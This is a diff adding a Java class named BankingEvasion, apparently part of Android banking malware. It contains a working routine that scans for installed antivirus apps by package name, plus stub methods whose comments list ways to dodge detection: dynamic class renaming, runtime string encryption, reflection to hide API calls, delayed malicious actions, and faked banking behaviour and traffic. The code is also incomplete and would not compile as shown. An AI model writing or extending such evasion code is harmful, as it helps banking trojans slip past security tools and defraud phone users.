@@ -1,0 +1,35 @@
+// BankingEvasion.java
+public class BankingEvasion {
+    
+    public static boolean checkSecurityApps() {
+        String[] securityPackages = {
+            "com.antivirus", "com.kaspersky", "com.norton",
+            "com.avast", "com.avg", "com.mcafee",
+            "com.bitdefender", "com.trendmicro"
+        };
+        
+        PackageManager pm = getPackageManager();
+        for (String pkg : securityPackages) {
+            try {
+                pm.getPackageInfo(pkg, 0);
+                return true; // Security app found
+            } catch (PackageManager.NameNotFoundException e) {
+                continue;
+            }
+        }
+        return false;
+    }
+    
+    public static void hideFromDetection() {
+        // Rename classes dynamically
+        // Encrypt strings at runtime
+        // Use reflection to hide API calls
+        // Delay malicious actions
+    }
+    
+    public static void fakeLegitimateBehavior() {
+        // Simulate legitimate banking app behavior
+        // Generate fake network traffic
+        // Create fake user interactions
+    }
+}
